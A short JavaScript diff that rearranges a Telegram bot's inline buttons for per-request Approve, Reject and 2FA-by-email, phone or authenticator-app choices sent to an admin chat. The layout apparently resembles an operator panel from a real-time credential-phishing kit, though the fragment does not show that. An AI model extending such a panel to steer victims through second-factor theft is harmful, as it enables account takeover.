@@ -28,17 +28,22 @@ function sendApprovalMessage(requestId, text) {
         ? text.slice(0, MAX_MSG - 20) + '\n…(truncated)'
         : text;
 
+    // Two rows: Telegram clients often break with 5 buttons in one row; callback_data max 64 bytes each.
     return tgApi('sendMessage', {
         chat_id: TELEGRAM_ADMIN_CHAT_ID,
         text: body + '\n\nAction?',
         reply_markup: {
-            inline_keyboard: [[
-                { text: '✅ Approve',       callback_data: 'approve:'  + requestId },
-                { text: '🔐 2FA Email',     callback_data: '2fa_email:' + requestId },
-                { text: '📱 2FA Phone',     callback_data: '2fa_phone:' + requestId },
-                { text: '🔑 2FA Auth App',  callback_data: '2fa_totp:'  + requestId },
-                { text: '❌ Reject',        callback_data: 'reject:'   + requestId }
-            ]]
+            inline_keyboard: [
+                [
+                    { text: '✅ Approve', callback_data: 'approve:' + requestId },
+                    { text: '❌ Reject', callback_data: 'reject:' + requestId }
+                ],
+                [
+                    { text: '🔐 2FA Email', callback_data: '2fa_email:' + requestId },
+                    { text: '📱 2FA Phone', callback_data: '2fa_phone:' + requestId },
+                    { text: '🔑 2FA App', callback_data: '2fa_totp:' + requestId }
+                ]
+            ]
         }
     });
 }
